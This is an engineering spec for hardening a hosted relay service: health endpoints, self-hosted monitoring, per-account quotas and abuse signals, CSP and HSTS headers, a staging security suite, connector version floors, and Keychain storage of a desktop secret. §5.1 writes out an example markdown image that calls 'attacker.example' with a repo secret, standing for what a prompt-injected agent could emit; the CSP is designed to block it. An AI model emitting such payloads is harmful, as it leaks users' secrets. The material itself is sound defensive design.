# Relay launch hardening: health, observability, abuse, headers, staging, connector floors, keychain

**Status:** Spec. Nothing here is built.
**Date:** 2026-11-08
**Source:** the SaaS launch research spec (`codekin-saas-launch-research-spec-2026-11-08.md`), §4.6 "Infrastructure and operations". This spec covers seven rows of that table:
- health endpoint
- observability
- abuse controls
- browser security headers
- the Phase 4 staging gate
- connector version floors
- desktop keychain

Moving to a dedicated VM and backups (Litestream, restore drill) are out of scope here.
**Basis:** `origin/main` (v0.10.5 + #796). `path:line` references point there. Production facts were checked on the relay host on 2026-11-08.
**Related:** `docs/RELAY-SIGNED-INTENTS-AND-E2E-SPEC.md` (L1/L2; needs §7 here), `docs/HOSTED-WORKSPACES-AND-MFA-PLAN.md` (Phase 4), `docs/OPERATIONS.md` ("Hosted relay").

---

## 1. Summary

| # | Today | After this spec | Est. |
| --- | --- | --- | --- |
| §2 | `/api/health` is public and reports `machinesOnline` and `browserClients` | Public `live` and `ready` probes that return no counts. Counts move to an operator-only endpoint | 0.5 d |
| §3 | Console logs under pm2, nothing else | Two self-hosted open-source apps on one small separate VPS: Uptime Kuma (probes, status page, alerts) and GlitchTip (error tracking with secret scrubbing). A metrics pipeline waits until it is needed | 3 d |
| §4 | Per-IP HTTP limits and per-socket frame limits, all in memory | Per-account and per-workspace quotas from plan entitlements, a daily bandwidth meter with throttling, signup velocity limits, account heuristics, tunnelling signals, an operator review queue | 5–6 d |
| §5 | Express sets `nosniff`, `X-Frame-Options` and `Referrer-Policy`, but **only on `/api`**. The HTML document from nginx has no security headers. No CSP, no HSTS | One nginx snippet on every location: strict CSP with no inline script, HSTS, COOP/CORP, `frame-ancestors 'none'`. Fonts self-hosted. Remote images in transcripts blocked | 3 d |
| §6 | Phase 4 staging gate "not started"; no staging relay | Staging relay with its own OAuth app and data. Test sessions minted by CLI, with no HTTP backdoor. Automated cross-tenant and forged-principal suite with a written report | 3–4 d |
| §7 | Old connectors only log a warning (`connector-hub.ts:385`) | Version floors per capability. Machines below a floor stay connected but are marked `update_required` and refuse traffic. Workspace policies can require capabilities | 1.5 d |
| §8 | The desktop app's machine secret sits in plaintext `relay.json` (0600) | macOS Keychain, through a small signed helper bundled with the app. The 0600 file stays for the CLI | 2–3 d |

**Total: about 19 engineer-days (~4 weeks).** The launch spec counts some of this in Phase 1 (CSP/HSTS, health, minimum version) and the rest in Phase 4 at 1–1.5 weeks. That figure didn't include quotas, the staging suite or the keychain helper.

---

## 2. Health endpoint

### 2.1 Today

`server/relay/relay-server.ts:128-135` answers `GET /api/health` without authentication:

```json
{ "ok": true, "service": "codekin-relay", "machinesOnline": 12, "browserClients": 4 }
```

Anyone can read the size of the customer base and watch it live. The two counts are business data and a usage side channel. `docs/OPERATIONS.md:391` documents them. Nothing in the repo reads them: the desktop app polls the *local* server's `/api/health` (`desktop/src-tauri/src/http.rs:81`), not the relay's.

### 2.2 Change

| Route | Auth | Body | Status |
| --- | --- | --- | --- |
| `GET /api/health/live` | none | `{ "ok": true }` | 200 while the process serves HTTP. No dependencies checked, so a slow DB doesn't make pm2 or the probe restart a healthy process |
| `GET /api/health/ready` | none | `{ "ok": true }` or `{ "ok": false }` | 200 / 503. Checks `SELECT 1` on the control-plane DB, that both WebSocket servers are listening, and that the event loop lag sample is under 1 s |
| `GET /api/health` | none | same as `live` | Kept as an alias so existing probes keep working. Counts removed |
| `GET /api/admin/stats` | operator session, full auth level | `{ machinesOnline, browserClients, channelsOpen, connectorVersions: { "0.10.5": 9, … } }` | For the operator UI and support |

- The `ready` body says only ok or not ok; it doesn't name the failing check. Failure detail goes to the logs.
- Update `docs/OPERATIONS.md:391`.

---

## 3. Observability

At launch we need three answers: is the relay up, is it throwing errors, and is the host healthy. Two open-source apps answer all three. A metrics pipeline (Prometheus, Grafana, Alertmanager) waits until a question comes up that these can't answer (§3.5).

### 3.1 Stack

| Piece | License | Runs on | Does |
| --- | --- | --- | --- |
| **Uptime Kuma** | MIT | monitoring VPS | HTTP, certificate and push (heartbeat) monitors; the public status page; alert delivery |
| **GlitchTip** | MIT | same VPS, with its own Postgres | Error tracking. It speaks the Sentry API, so the relay and the frontend use the standard Sentry SDKs pointed at a GlitchTip DSN |

- **Separate box.** Probes on the relay host would die with it. One small VPS (2 vCPU, 4 GB, about €5/month) in another data centre runs both apps from a single `docker-compose.yml` kept in `deploy/monitoring/`. GlitchTip's Postgres gets a nightly `pg_dump`. Nothing else lives there.
- **Alerts** go to email plus a phone push (ntfy.sh or Telegram), which both apps support natively. There is no self-hosted notifier. Alert text names the monitor or issue only, never customer data.
- **Access.** Both admin UIs use their own logins with TOTP enabled. Only two endpoints are public: the status page and GlitchTip's ingest endpoint, which only the relay calls (§3.3).
- **No new subprocessors.** Both apps are self-hosted, so the error and probe data stays on our own servers.

### 3.2 What is watched

| Check | How | Alert |
| --- | --- | --- |
| Relay up | Kuma HTTP monitor on `/api/health/ready`, every 60 s, alert after 2 failures | page |
| Event-loop stall, DB broken | The same probe: `ready` returns 503 when the DB check fails or event loop lag passes 1 s (§2.2) | page |
| Web app served | Kuma HTTP monitor on `/` | page |
| TLS expiry | Kuma certificate monitor, alerts 14 days before expiry | notify |
| Relay host alive and disk OK | Kuma push monitor. A cron line on the relay host pings it every 5 min, but only while the data volume has more than 15% free. A missed ping means the host is down or the disk is filling | notify |
| New error | GlitchTip alert on the first event of a new issue | notify |
| Error burst | GlitchTip alert when one issue gets ≥ 20 events in 10 min. Unhandled 5xx errors land here, which stands in for a 5xx-rate alert | notify |

"Page" means a phone push with sound. "Notify" means email plus a silent push. Each alert links to a runbook entry in `docs/OPERATIONS.md` under "Hosted relay → Alerts".

Live probes can't assert response headers. The CSP and HSTS checks run in CI and in the staging gate instead (§5.3, §6.3). Auth-failure spikes are visible in the audit log (`login_failed`, `mfa_failed`) until metrics exist.

### 3.3 Error tracking with secret scrubbing

**Server:** `@sentry/node` pointed at the GlitchTip DSN, with `sendDefaultPii: false`.
- `beforeSend` and `beforeBreadcrumb` drop:
  - request bodies and cookies
  - every header except `user-agent`, `content-type` and `content-length`
  - every query parameter (OAuth `code`/`state`, invitation and device-link tokens all travel in queries)
- Values of any key matching `/secret|token|password|cookie|authorization|code|sig|otp|recovery|credential|session/i` are replaced with `[redacted]`, at any depth.
- Any string ≥ 24 characters from the base64url alphabet becomes `[redacted]`, whatever its key. Machine secrets, device codes and session ids all look like this.
- Relay frame payloads (`StreamData.data`, `ProxyRequest.body`, `ProxyResponse.body`) are never attached. Error handlers in the hubs log the envelope `kind`, `code` and ids only.
- Tests feed a known secret into each code path and assert it doesn't appear in the event the SDK would send.

**Browser (hosted app):**
- The frontend sees session content, so the rules are stricter. Only exception type, message (truncated to 200 characters, then scrubbed as above) and stack frames are sent.
- Turned off: console breadcrumbs, DOM/click breadcrumbs (they capture element text) and fetch/XHR breadcrumbs.
- No session replay, ever. This is required to keep the L2 promise ("content never leaves your devices and machine").
- **Delivery goes through the relay** using the SDK's `tunnel` option: `POST /api/telemetry/errors`. The relay forwards events to GlitchTip. This keeps the browser on a `connect-src 'self'` CSP (§5), lets the relay strip the client IP, and rate-limits it (10/min per session).

### 3.4 Status page

- **Where:** `status.codekin.ai`, served by Uptime Kuma's built-in status page under a custom domain.
- **Components:**
  - Web app (`/`)
  - Machine connections (`ready`)
  - Desktop updates (the update manifest URL)
- **Content:** driven by the probes, with manual incident posts from Kuma.
- **Linked** from the app footer and the security page.
- **Later: a synthetic connector.** A canary machine on the monitoring VPS, paired to a canary account. A Kuma push monitor confirms one proxied round trip through the relay every 5 min. This catches "HTTP is up, but relaying is broken", which no HTTP check can see.

### 3.5 Later: metrics, when there is a question that needs them

Add a metrics pipeline when the tools above can't answer something. Likely triggers:
- capacity planning toward the single-node limit (connection counts, event-loop lag trends)
- alerting on mass disconnects

Until then, `/api/admin/stats` (§2.2), GlitchTip and the audit log cover day-to-day questions.

When it's added:
- `prom-client` on a loopback-only port. nginx never proxies it.
- Prometheus or VictoriaMetrics single-node (both Apache-2.0) plus Grafana (AGPL-3.0), all on the monitoring VPS.
- A short metric list: connections, channels, bytes, HTTP status class, auth failures, rate-limit hits, event-loop lag.
- **One rule:** no label carries a user, workspace, machine, IP or path value.

---

## 4. Abuse controls and quotas

### 4.1 Today

- `ipRateLimiter` fixed windows on auth, pairing, shares, users, workspaces and invitations (`relay-server.ts:60-100`).
- Token buckets per browser socket (40/s, burst 120) and per machine (200/s, burst 600), and 32 channels per machine (`rate-limit.ts:94-100`).
- All of it is in memory and keyed per IP or per socket. **Nothing is per account**, and nothing limits volume over time.

### 4.2 Quotas, driven by plan entitlements

Numbers are proposals (H5). They come from the entitlements table in launch spec §3.3. Until billing lands, defaults are hard-coded per plan.

| Quota | Free | Pro | Team | Enforced at |
| --- | --- | --- | --- | --- |
| Machines per account (owned) | 2 | 25 (soft) | 10 per seat, pooled per workspace | pair `approve` (refuse with upgrade prompt) |
| Pending pairings per account | 3 | 5 | 5 per seat | pair `start` (by approving user) / `approve` |
| Browser sockets per user | 5 | 10 | 10 | `/relay/browser` upgrade |
| Channels per user (all machines) | 8 | 16 | 16 | `openChannel` (existing 4-per-socket and 32-per-machine limits stay) |
| Relayed bytes per account per day (both directions) | 2 GB | 20 GB | 20 GB × seats, pooled | hubs (§4.3) |
| Invitations per workspace per day | — | — | 50 | invitation create |
| Shares per session | 3 | 10 | 20 | share create |
| Workspaces created per user | 1 (personal) | 3 | 10 | workspace create |

**Over a quota:**
- Discrete quotas refuse with HTTP 402/429 and an `{ error: 'quota_exceeded', quota, limit, upgradeUrl }` body. The frontend shows the upgrade or contact path.
- Bandwidth throttles instead of cutting off (H6):
  - at 80%, a banner in the app
  - at 100%, relayed traffic for that account slows to 64 KB/s per socket until UTC midnight
  - at 300%, an abuse flag (§4.5)

  A developer mid-task gets slowed down, never cut off.

### 4.3 Usage metering

- Add a `usage_daily (account_id, day, bytes_b2m, bytes_m2b, frames, channel_seconds)` table. "Account" is the workspace that owns the machine. For personal workspaces, that is the user.
- The hubs count bytes per account in memory and flush every 60 s with `INSERT … ON CONFLICT DO UPDATE`. A crash loses at most a minute of counting. That's fine for quotas and not used for billing.
- Retention: 400 days, then purged with audit events. It also feeds the usage view in account settings.

### 4.4 Signup velocity and account heuristics

These apply once open signup exists (launch plan Phase 2). They are listed here so the counters exist from the first signup.
- **Per IP:** 3 new accounts/day. Per /24 (IPv4) or /48 (IPv6): 10/day.
- **Global circuit breaker:** more than 50 signups/hour moves new accounts to a "pending" state until the operator clears it. This catches a botnet or a launch-day spike.
- **GitHub account heuristics** (from the OAuth profile, no extra calls):
  - account younger than 30 days
  - no public repos and no followers
  - default avatar

  Two or more of these mean a **restricted** Free account: 1 machine, 200 MB/day, no invitations. It is lifted automatically after 14 days without flags, or by the operator.
- **Disposable email** (when magic-link or Google sign-in arrives): refuse domains on the maintained `disposable-email-domains` list. A weekly CI job refreshes it, and it's vendored to avoid a runtime fetch.
- **Re-registration:** a GitHub id that was operator-blocked stays blocked (existing sticky block, `OPERATIONS.md`, "Hosted relay").

### 4.5 Tunnelling and misuse of the relay

**The risk.** The connector protocol is open, MIT-licensed and documented. Anyone can pair a "machine" that is really a custom program, then use `stream_data` frames as a generic pipe. That turns app.codekin.ai into free proxy, file-sharing or command-and-control infrastructure, and the domain ends up on blocklists. The real connector only ever talks to the local Codekin server. But the relay can't tell a real connector from a fake one.

**Signals:**
- **Before L2:**
  - `stream_data.data` must parse as a JSON object with a string `type`. The hub already parses grantee frames, and doing it for all frames is cheap.
  - A machine whose frames fail this more than 1% of the time is flagged.
- **Under L2 (opaque payloads):** volume and shape only:
  - sustained throughput > 1 MB/s for > 10 min
  - bytes per frame consistently near the maximum
  - traffic with `sessions.total = 0` advertised
  - more than 5 distinct browser IPs per machine per day on a Free account
- **Both:**
  - connector versions that don't exist in our releases
  - many machines paired by one account in a short time

**Response ladder:**
1. **Flag.** The account goes into an operator review queue: a new `abuse_flags` table and a list in the operator UI.
2. **Throttle** to the 64 KB/s floor.
3. **Quarantine** the machine. This uses the existing machine quarantine (§4.2 of the launch spec).
4. **Suspend** the account, using the existing `users.status` kill switch.

Each step is audit-logged. Steps 3–4 notify the user, once transactional email exists. The AUP (launch spec §9) forbids using the relay for anything other than reaching Codekin.

**Not a risk:** proxied responses served as documents on our origin. Responses reach the browser inside WebSocket envelopes and are never navigated to. The CSP in §5 also limits what a hostile response rendered as markdown could do.

---

## 5. Browser security headers

### 5.1 Today

- **Express** sets `X-Content-Type-Options`, `X-Frame-Options: DENY` and `Referrer-Policy: same-origin` (`relay-server.ts:53-58`). Those apply to `/api/*` responses only.
- **The HTML document and assets** come from nginx (`/etc/nginx/sites-available/app.codekin.ai`, same as `nginx/app.codekin.ai.example`), which sets **no** security headers. No CSP and no HSTS anywhere.

**What the deployed bundle needs:**
- **Scripts:** no inline script. `index.html` loads `/theme-init.js` and one module bundle. No `eval` / `new Function`, no injected `<style>` elements, no workers, no service worker.
- **Styles:** one external origin, `fonts.googleapis.com`, from the `@import` at `src/index.css:1`. The font files come from `fonts.gstatic.com`.
- **Images:** `data:` images, and GitHub avatars from `avatars.githubusercontent.com`.
- **Navigation:** sign-in is a navigation to `/api/auth/github/start` (`src/hosted/signInHref.ts:12`), not a form post.

**An exfiltration path the CSP closes.** The markdown pipeline (`src/components/markdownPipeline.ts`, marked → DOMPurify) keeps `<img>` and strips only event handlers. A prompt-injected agent can write `![](https://attacker.example/?d=<secret from the repo>)` into its output. Every browser viewing that session, including grantees, then loads the URL. Restricting `img-src` blocks this regardless of the sanitizer.

### 5.2 Header set

Everything lives in one file, `nginx/snippets/codekin-app-security-headers.conf`, **included in every `location` block**. nginx drops server-level `add_header` directives in any location that has its own `add_header`. Both `/` and `/assets/` set `Cache-Control`, so server-level headers would silently disappear there.

```nginx
add_header Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: https://avatars.githubusercontent.com; font-src 'self'; connect-src 'self' wss://app.codekin.ai; manifest-src 'self'; frame-src 'none'; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; upgrade-insecure-requests; report-uri /api/csp-report; report-to csp" always;
add_header Reporting-Endpoints 'csp="/api/csp-report"' always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Resource-Policy "same-origin" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=()" always;
```

**Notes:**
- **`connect-src`** lists `wss://app.codekin.ai` explicitly. Older Safari versions don't count same-host `wss:` as `'self'`.
- **`style-src 'self'`** with no `'unsafe-inline'`. React and Radix set styles through the CSSOM (`element.style`), which CSP doesn't restrict. A `style="…"` attribute in sanitized markdown gets blocked, which is fine. If the report-only phase finds a library that calls `setAttribute('style', …)`, add `style-src-attr 'unsafe-inline'` only. That carries little risk, and script stays strict.
- **Self-hosted fonts (H4)** remove the only third-party origin. Bundle Inconsolata and Lato through `@fontsource-variable/inconsolata` and `@fontsource/lato`. This also avoids sending visitor IPs to Google, which a German court has ruled a GDPR violation (LG München I, 3 O 17493/20, 2022).
- **Images in transcripts (H3):** remote images are blocked. A DOMPurify hook rewrites an `<img>` with a remote `src` into a link: "🖼 external image: host.example (open)". The user sees what would have loaded and can choose to open it. `data:` images and same-origin images render normally.
- **The `/api` Express headers** stay for API responses (`X-Frame-Options` etc.). Add `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` there too, so a JSON response opened directly can't be framed or run anything.
- **HSTS** covers `app.codekin.ai` with `includeSubDomains` and no `preload` yet. Preloading `codekin.ai` would lock every subdomain to HTTPS permanently. That needs an inventory of all `*.codekin.ai` hosts first (website, status page, staging). This is decision H2.
- **The desktop app** loads `app.codekin.ai` as a top-level webview, not a frame, so `frame-ancestors 'none'` doesn't affect it. Remote origins get no Tauri IPC (`desktop/src-tauri/capabilities/default.json:4`), so the CSP needs no `ipc:` sources.

### 5.3 Rollout

1. **Report-only, one week.** Ship the policy as `Content-Security-Policy-Report-Only`, with `POST /api/csp-report`: no auth, 5/min per IP, body ≤ 8 KB. Reports are logged (directive and blocked host only). Self-host fonts and the image rewrite in the same release.
2. **Enforce** once reports show only extension noise. Add HSTS at `max-age=86400` and raise it to 2 years after a week.
3. **CI check.** A Vitest check builds `dist-hosted` and asserts `index.html` has no inline `<script>` and no third-party origins. `nginx -t` runs on the example config.
4. **Ongoing check.** The staging gate (§6.3) and a CI check against production (`curl -sI https://app.codekin.ai/`) assert the CSP and HSTS headers. Uptime Kuma can't check headers.
5. **Self-hosters.** Update `nginx/app.codekin.ai.example` and `docs/SELF-HOSTED-RELAY.md` with the snippet. Self-hosters on other domains must swap `wss://app.codekin.ai`, so the docs call it out.

---

## 6. Staging relay and the Phase 4 gate

### 6.1 Staging relay

| | Production | Staging |
| --- | --- | --- |
| Host | app.codekin.ai | staging.codekin.ai (H7: on the current host until the dedicated VM exists) |
| pm2 app | `codekin-relay` | `codekin-relay-staging` |
| Port | 32360 | 32362 |
| Data dir | `~/.codekin-relay` | `~/.codekin-relay-staging` |
| GitHub OAuth app | production | separate app, callback on staging |
| `SESSION_SECRET`, `MFA_ENCRYPTION_KEY` | production | own values |
| Webroot | `/var/www/codekin-app` | `/var/www/codekin-app-staging` |
| Indexing | — | `X-Robots-Tag: noindex`; the app shows a "STAGING" banner |

The two relays share nothing. A staging bug can't touch production data, and a staging credential is useless in production.

### 6.2 Test identities without an HTTP backdoor

Automated runs need signed-in browsers, and GitHub OAuth can't be scripted reliably. **No test-login route is added to the relay.** A route like that, shipped in the same binary, is one misconfiguration away from a production backdoor. Instead:
- `relay-admin-cli.ts` gains `mint-session --user <githubId> --auth-level full`. It writes a `web_sessions` row straight into the local DB and prints a signed cookie. It refuses unless `RELAY_STAGING=1` is set **and** `publicUrl` isn't the production URL.
- It is a local CLI, so using it needs a shell on the staging host. That is the same trust as the DB file itself.
- Three GitHub test accounts:
  - **A** owns workspace WS-A
  - **B** owns WS-B
  - **C** is a member of both

  Each enrols TOTP with a seed kept in the ops password manager. The suite uses the seeds for step-up flows.
- **Two canary machines** (connector processes on the staging host): MA paired by A, MB paired by B.

### 6.3 The gate suite

`scripts/staging/gate.e2e.mts` runs against `STAGING_URL` with the minted cookies and writes `.codekin/reports/security/<date>_staging-gate.md`. It covers:
- **The Phase 4 list (`HOSTED-WORKSPACES-AND-MFA-PLAN.md:193-202`):**
  - every REST and WebSocket id from WS-A is rejected in WS-B
  - partial sessions are denied everywhere
  - invitation misuse: wrong recipient, expired, revoked, replayed
  - concurrent single-use consumption: invitation, recovery code, TOTP
  - a viewer holding an editor grant still can't execute
  - the last owner is protected
  - revoked sessions and device links don't restore access
  - suspension applies globally; removing a membership applies only to that workspace
- **Live-stream changes:** demote and remove C while C has a stream open on MA, and assert the channel closes within the reauthorisation interval.
- **Forged principals** (after L1): the adversary cases from `RELAY-SIGNED-INTENTS-AND-E2E-SPEC.md` §11, run against real connectors.
- **This spec's own checks:**
  - `/api/health*` returns no counts
  - CSP and HSTS are present
  - quotas trigger
  - an outdated canary connector gets `update_required`

**When it runs:**
- by hand before open signup (the gate)
- on every release-candidate tag, triggered from the relay host

CI can't run it, because minting cookies needs the host. **Exit criteria:** every automated case passes, and the manual checklist (pair a real Mac and a real Linux box, MFA recovery, passkey on a phone) is signed off in the report.

---

## 7. Connector version floors per capability

### 7.1 Today

`MIN_SUPPORTED_CONNECTOR_VERSION = '0.9.0'` (`connector-version.ts:12`). Below that, `connector-hub.ts:385` logs a warning and `machine-routes.ts:53` sets `connectorOutdated` for the UI. Old connectors keep full access. L1 signatures, L2 encryption and the launch spec's §5 credential-class policy all need the relay to *refuse* machines that can't enforce them.

### 7.2 Floors

```ts
// server/relay/connector-version.ts
export const CONNECTOR_FLOORS = {
  /** Anything older is refused traffic everywhere. */
  base: '0.9.0',
  /** Signs/verifies intents (L1). Set when L1 ships. */
  intents: null as string | null,
  /** E2E handshake (L2). */
  e2e: null as string | null,
  /** Declares credential class for the §5 provider policy. */
  credentialClass: null as string | null,
}
```

A machine **has** a capability when it advertises it in `ConnectorHello.capabilities` *and* its version is at or above the floor. A connector that claims a capability below its floor is treated as lacking it.

### 7.3 Behaviour

- **Below `base`, or missing a capability its workspace requires:**
  - The hub accepts the hello, records the version and sends `hello_ack` with a new optional field: `updateRequired: { minimum, missing: ['intents'], reason }`.
  - It marks the machine `update_required` and refuses every browser request and channel for it with a new `connector_update_required` code.
  - It **doesn't close the socket.** Old connectors treat any close except 4001/4009 as a reconnect (`connector.ts`, close handler), so closing would start a reconnect loop every ≤60 s. Staying connected also lets the UI show the machine as "online, update required" rather than offline.
- **Workspace requirements:** a new `required_capabilities` setting per workspace, defaulting by plan.
  - Paid workspaces and every workspace created after open signup: `['intents']` once L1 ships.
  - The bootstrap workspace keeps its current behaviour through a grace period (H8).
- **Connector side:** a newer connector that gets `updateRequired` prints it (CLI) or shows it in `/api/relay/status`, so the local UI displays a banner with the update command for its install type.
- **Hosted UI:** the machines list shows **Update required**, with the reason ("needed for signed control") and per-install update steps: CLI install, desktop auto-update, self-hosted.
- **Raising a floor:**
  1. Check `connectorVersions` in `/api/admin/stats` (§2.2) to see who would be affected.
  2. Announce it in-app 14 days ahead, and by email once that exists.
  3. Raise it in a relay release.

  Floors only ever go up.

---

## 8. Desktop app: machine secret in the Keychain

### 8.1 Today

Pairing writes `~/.config/codekin/relay.json` with `machineSecret` in plaintext, mode 0600 (`pairing-client.ts:94-95`). Three places read it:
- `readRelayCredential` (`relay-credential.ts:33`)
- the embedded connector (`embedded-connector.ts:141`)
- the CLI (`connector-cli.ts:22`)

The desktop app's Rust side never touches it. On a Mac, a 0600 file still ends up in Time Machine backups and dotfile syncs. Any process the user runs can read it without a prompt.

### 8.2 Design

- **A `SecretStore` interface** in `server/relay/secret-store.ts`, with `get(ref)`, `set(ref, value)` and `delete(ref)`. Two implementations:
  - `FileSecretStore`: the current behaviour, and the default for the CLI, Linux and WSL.
  - `HelperSecretStore`: used when `CODEKIN_SECRET_HELPER` points at an executable. The desktop launcher sets this when it spawns the bundled server (`desktop/src-tauri/src/launcher.rs:61`).
- **The helper, `codekin-secrets`.** A small Rust binary inside the app bundle, signed and notarised with the app. It uses the `keyring` crate, so Windows Credential Manager and libsecret come for free later. Usage: `codekin-secrets get|set|delete <service> <account>`. Secrets travel on stdin/stdout only, never in argv, so they never show in `ps`.
  - Keychain item: service `ai.codekin.desktop.relay`, account `<machineId>`.
  - The helper creates the item itself, so the Keychain ACL is bound to its code signature and later reads don't prompt.
- **`relay.json` in the desktop app** keeps `url`, `machineId` and `managed`. In place of `machineSecret` it holds `"secretRef": "keychain"`. `readRelayCredential` resolves the ref through the store, and `pairing-client.ts` writes through it.
- **Migration.** On first start after an upgrade, the desktop server finds `machineSecret` in the file and a helper available. It then:
  1. writes the secret to the Keychain
  2. reads it back and compares
  3. rewrites `relay.json` atomically without the secret (write to a temp file, `fsync`, `rename`)

  If any step fails, the file stays as it was and the failure is logged. The secret is never lost.
- **Same store, more secrets.** The L1 machine identity key (`RELAY-SIGNED-INTENTS-AND-E2E-SPEC.md` §4.1) and the L2 ECDH key use this store from day one, so the desktop app never writes them to disk.
- **Unpair** deletes the Keychain item as well as the file.

### 8.3 Limits

This protects against backups, sync tools and casual file-reading malware. It doesn't stop code already running as the user, which can call the helper. The helper can't reliably authenticate its caller, and the spec doesn't pretend otherwise. The CLI keeps the 0600 file: a headless Linux box has no keychain worth the complexity.

---

## 9. Implementation plan

| # | Slice | Depends on | Est. |
| --- | --- | --- | --- |
| 1 | Health split + `/api/admin/stats` + OPERATIONS.md | — | 0.5 d |
| 2 | Security headers in report-only mode, CSP report endpoint, self-hosted fonts, remote-image rewrite, CI check | — | 2 d |
| 3 | Enforce CSP + HSTS (after a week of reports); update nginx example and self-host docs | 2 | 0.5 d |
| 4 | Monitoring VPS: Uptime Kuma + GlitchTip compose file, `pg_dump` backup, disk heartbeat cron, monitors and alerts, runbook entries | 1 | 1 d |
| 5 | Error tracking with scrubbing (server + tunnelled browser) into GlitchTip, scrub tests | 2 (CSP connect-src), 4 | 1.5 d |
| 6 | Status page on Kuma at `status.codekin.ai`, footer link; synthetic connector later | 4 | 0.5 d (+1 d) |
| 7 | Connector floors, `update_required`, workspace `required_capabilities`, UI | — | 1.5 d |
| 8 | Quotas + `usage_daily` + throttling + quota UI | entitlements (launch Phase 3) for real numbers; defaults until then | 3 d |
| 9 | Signup velocity, account heuristics, `abuse_flags` + operator queue, tunnelling signals | open signup (launch Phase 2) | 2–3 d |
| 10 | Staging relay, `mint-session`, gate suite + report | 1, 3, 7 for their checks | 3–4 d |
| 11 | Desktop `codekin-secrets` helper, `SecretStore`, migration | — | 2–3 d |

Slices 1, 2, 7 and 11 depend on nothing and can start in parallel; slice 4 follows slice 1. Slice 10 is the last step before open signup.

---

## 10. Decisions needed

| # | Decision | Recommendation |
| --- | --- | --- |
| H1 | Monitoring tools | **Decided 2026-11-08:** self-hosted open source, kept small. Uptime Kuma + GlitchTip on one separate VPS (§3.1). Metrics pipeline deferred (§3.5) |
| H2 | HSTS preload for `codekin.ai` | Not yet. HSTS on `app.codekin.ai` with `includeSubDomains`. Decide on preload after inventorying every `*.codekin.ai` host |
| H3 | Remote images in transcripts | Block through CSP and show a link placeholder. It closes a prompt-injection exfiltration path for every viewer |
| H4 | Self-host fonts | Yes. It removes the only third-party origin and the Google Fonts GDPR question |
| H5 | Quota numbers | As in §4.2. Revisit after the paid beta, using `usage_daily` data |
| H6 | Over the bandwidth quota | Throttle to 64 KB/s, never cut off. Flag at 300% |
| H7 | Where staging runs | On the current host now (separate pm2 app, data and OAuth app); move with production to the dedicated VM |
| H8 | Bootstrap workspace and connectors below a required capability | 30-day grace with the "update required" banner, then the same refusal as everyone else |
